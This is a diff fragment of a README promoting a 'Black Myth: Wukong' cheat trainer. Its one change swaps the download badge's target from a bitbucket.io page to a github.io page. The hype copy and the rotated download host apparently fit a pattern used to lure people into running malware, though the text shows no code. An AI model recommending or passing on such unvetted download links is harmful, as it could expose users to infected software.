@@ -6,7 +6,7 @@
 
 This isn’t some basic cheat — the **Wukong Trainer** gives you real-time access to **God Mode, One-Hit Kill, Infinite Stamina, Skill Unlocks**, and more through a sleek in-game UI. Whether you're here to test builds or just flex on bosses, this is the tool.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Black-Myth-Wukong-Trainer-nyten.github.io/.github)
 ---
 
 ## 🎮 What Is a Black Myth Trainer?
